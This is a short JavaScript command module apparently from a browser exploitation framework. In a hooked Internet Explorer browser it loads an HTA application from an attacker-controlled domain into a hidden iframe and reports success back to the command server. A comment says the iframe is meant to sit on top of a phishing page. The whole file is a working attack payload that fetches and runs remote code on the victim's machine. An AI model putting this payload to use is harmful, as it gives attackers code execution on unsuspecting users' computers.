//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function(){

    var hta_url = '<%= @domain %>' + '<%= @ps_url %>' + '/hta';

    if (server.browser.isIE()) {
        // application='yes' is IE-only and needed to load the HTA into an IFrame.
        // in this way you can have your phishing page, and load the HTA on top of it
        server.dom.createIframe('hidden', {'src': hta_url, 'application': 'yes'});
        server.net.send('<%= @command_url %>', <%= @command_id %>, 'HTA loaded into hidden IFrame.');
    }
});
